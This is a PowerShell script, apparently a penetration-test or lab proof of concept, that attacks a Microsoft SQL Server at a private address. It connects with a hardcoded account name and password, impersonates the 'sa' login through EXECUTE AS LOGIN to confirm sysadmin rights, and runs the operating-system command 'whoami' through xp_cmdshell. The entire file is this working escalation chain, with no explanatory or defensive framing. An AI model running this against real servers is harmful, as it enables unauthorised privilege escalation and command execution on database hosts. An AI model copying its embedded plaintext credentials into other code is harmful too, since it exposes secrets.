[CmdletBinding()]
param(
    [Parameter(Mandatory=$false)]
    [string]$Server = "192.168.77.22"
)
$ErrorActionPreference = "Stop"
$connStr = "Server=$Server;Database=master;Integrated Security=false;User ID=analyst_t1;Password=T13r_An@lyst!;TrustServerCertificate=True;"
try {
    Add-Type -AssemblyName System.Data
    $conn = New-Object System.Data.SqlClient.SqlConnection($connStr)
    $conn.Open()
    Write-Output "SQL_OK: connected to $Server as analyst_t1"

    $cmd = $conn.CreateCommand()
    $cmd.CommandText = "EXECUTE AS LOGIN = 'sa'; SELECT IS_SRVROLEMEMBER('sysadmin'); REVERT"
    $isSysadmin = $cmd.ExecuteScalar()
    Write-Output "sysadmin_membership=$isSysadmin"

    $cmd.CommandText = "EXECUTE AS LOGIN = 'sa'; EXEC master..xp_cmdshell 'whoami'; REVERT"
    $reader = $cmd.ExecuteReader()
    while ($reader.Read()) {
        if ($reader.IsDBNull(0)) { continue }
        Write-Output "xp_cmdshell: $($reader.GetString(0))"
    }
    $reader.Close()

    $conn.Close()
} catch {
    Write-Output "SQL_FAIL: $($_.Exception.Message)"
    exit 1
}
